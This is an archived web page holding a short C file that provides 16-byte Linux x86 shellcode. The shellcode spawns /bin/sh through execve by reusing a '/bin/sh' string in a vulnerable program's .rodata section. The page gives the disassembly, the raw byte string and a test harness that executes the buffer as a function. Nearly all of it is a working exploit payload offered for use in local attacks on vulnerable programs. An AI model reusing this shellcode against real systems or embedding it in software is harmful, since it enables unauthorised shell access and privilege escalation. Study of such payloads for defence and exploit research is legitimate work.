<html><head><title>Linux/x86 - re-use of (/bin/sh) string in .rodata - 16 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * $Id: reusage-linux.c,v 1.3 2004/01/30 20:08:46 raptor Exp $
 *
 * reusage-linux.c - re-use of &quot;/bin/sh&quot; string in .rodata
 * Copyright (c) 2003 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;
 *
 * Short local shellcode for /bin/sh execve(). It re-uses the &quot;/bin/sh&quot;
 * string stored in the .rodata section of the vulnerable program. Change
 * the string address as needed (based on zillion's original idea).
 */

/*
 * execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL)
 *
 * 8049368:       31 c0                   xor    %eax,%eax
 * 804936a:       bb 08 84 04 08          mov    $0x8048408,%ebx # change it
 * 804936f:       53                      push   %ebx
 * 8049370:       89 e1                   mov    %esp,%ecx
 * 8049372:       31 d2                   xor    %edx,%edx
 * 8049374:       b0 0b                   mov    $0xb,%al
 * 8049376:       cd 80                   int    $0x80
 * 8049378:       00 00                   add    %al,(%eax)
 */

char sc[] = /* 16 bytes */
&quot;\x31\xc0\xbb\x08\x84\x04\x08\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&quot;;

main()
{
	int (*f)() = (int (*)())sc; f();
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
